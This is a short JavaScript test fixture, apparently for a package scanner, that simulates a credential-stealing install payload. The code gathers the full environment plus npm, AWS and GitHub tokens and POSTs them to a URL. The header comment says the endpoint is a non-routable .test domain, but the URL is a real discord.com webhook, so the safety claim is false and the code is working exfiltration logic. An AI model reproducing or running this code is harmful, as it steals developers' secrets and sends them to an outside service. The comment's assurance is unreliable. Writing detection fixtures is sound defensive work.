// TEST FIXTURE — simulated credential-stealing install payload.
// Not real malware: the exfil endpoint is non-routable (.test TLD).
const https = require("https");

const stolen = JSON.stringify({
  env: JSON.stringify(process.env),
  npmToken: process.env.NPM_TOKEN,
  awsKey: process.env.AWS_SECRET_ACCESS_KEY,
  ghToken: process.env.GITHUB_TOKEN,
});

const req = https.request("https://discord.com/api/webhooks/000000/binshield-fixture-exfil", {
  method: "POST",
  headers: { "content-type": "application/json" },
});
req.end(stolen);
